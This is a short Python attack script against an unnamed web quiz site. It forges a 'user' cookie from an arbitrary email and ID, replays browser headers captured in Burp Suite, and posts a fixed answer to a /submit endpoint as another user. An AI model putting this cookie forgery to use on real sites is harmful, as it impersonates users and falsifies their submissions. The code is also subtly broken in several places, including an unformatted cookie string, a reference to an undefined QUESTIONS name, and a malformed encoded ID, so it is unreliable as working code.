import requests
import json

# omitting these for obvious reasons.
# if you set up a target, you can find this information by using burpsuite
HOST = '{INSERT HOST NAME HERE}'
REFERER = '{INSERT REFERER NAME HERE}'
ORIGIN = '{INSERT ORIGIN NAME HERE}'

QUESTION_NAMES = {
    1 : "Question A",
    2 : "The second question",
    3 : "Third of 3 questions",
    }

def submit(_id, question, userid):
    user_cookie = f"%22email%22:%22{userid}@hotmail.com%22%2C%22_id%22:%2{_id}%22"
    cookie = "user={user_cookie}"
    referer = f'{REFERER}/question-{question}'
    # headers derived from burpsuite interception, using burpsuite custom chromium browser
    headers = {
        'Host': f'{HOST}',
        'Cookie': f'{cookie}',
        'Content-Length': '102',
        'Sec-Ch-Ua': '"Chromium";v="103", ".Not/A)Brand";v="99"',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Origin': f'{ORIGIN}',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': f'{referer}',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        }

    
    data = f'{{"questionID":"{question}","questionName":"{QUESTIONS[question]}","submission":"34","userId":"{_id}"}}'

    response = requests.post('{HOST}/submit', headers=headers, data=data)

    # print(response)
    # print(response.content)
    response_dict = json.loads(response.content)
    assert response_dict["status"] == "correct"
